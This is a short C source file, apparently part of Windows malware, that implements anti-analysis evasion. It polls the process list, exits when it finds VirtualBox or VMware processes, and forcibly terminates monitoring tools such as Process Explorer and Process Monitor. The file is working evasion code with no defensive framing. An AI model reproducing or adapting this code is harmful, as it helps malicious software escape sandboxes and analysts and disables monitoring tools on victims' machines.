#include "../include/anti_eyes.h"  


DWORD WINAPI anti_virtual_machine(LPVOID lpParam) {
    while (true) {
        ExitProcess(1);  
    }
    return 0;
}

DWORD WINAPI detect_process(LPVOID lpParam) {
    HANDLE hProcessSnapshot;
    HANDLE hProcess;
    PROCESSENTRY32 processEntry32;
    DWORD dwPriorityClass;
    DWORD dwThreadAntiVirtualMachine;
    DWORD dwThreadAntiMonitor;

    while (true) {
        Sleep(3000);
        hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnapshot == INVALID_HANDLE_VALUE) return 0;

        processEntry32.dwSize = sizeof(PROCESSENTRY32);
        if (!Process32First(hProcessSnapshot, &processEntry32)) {
            CloseHandle(hProcessSnapshot);
            return 0;
        }

        do {
            dwPriorityClass = 0;
            hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processEntry32.th32ProcessID);
            if (hProcess != NULL) {
                dwPriorityClass = GetPriorityClass(hProcess);
                CloseHandle(hProcess);
            }

            if (lstrcmp(processEntry32.szExeFile, "VBoxTray.exe") == 0 ||
                lstrcmp(processEntry32.szExeFile, "VirtualBox.exe") == 0 ||
                lstrcmp(processEntry32.szExeFile, "VBoxSVC.exe") == 0 ||
                lstrcmp(processEntry32.szExeFile, "VMwareService.exe") == 0 ||
                lstrcmp(processEntry32.szExeFile, "VMwareTray.exe") == 0 ||
                lstrcmp(processEntry32.szExeFile, "VMwareUser.exe") == 0) {

                CreateThread(NULL, 0, anti_virtual_machine, NULL, NULL, &dwThreadAntiVirtualMachine);
            }

            if (lstrcmp(processEntry32.szExeFile, "procexp.exe") == 0 ||
                lstrcmp(processEntry32.szExeFile, "procmon.exe") == 0 ||
                lstrcmp(processEntry32.szExeFile, "Procexp64.exe") == 0 ||
                lstrcmp(processEntry32.szExeFile, "Procmon64.exe") == 0 ||
                lstrcmp(processEntry32.szExeFile, "svhost") == 0) {

                HANDLE hProcess1 = OpenProcess(PROCESS_TERMINATE, TRUE, processEntry32.th32ProcessID);
                if (TerminateProcess(hProcess1, -1) == 0) {
                    MessageBox(NULL, "Fail", "Error", NULL);
                }
                CloseHandle(hProcess1);
            }
        } while (Process32Next(hProcessSnapshot, &processEntry32));

        CloseHandle(hProcessSnapshot);
    }
    CloseHandle(&dwThreadAntiVirtualMachine);
    CloseHandle(&dwThreadAntiMonitor);
}
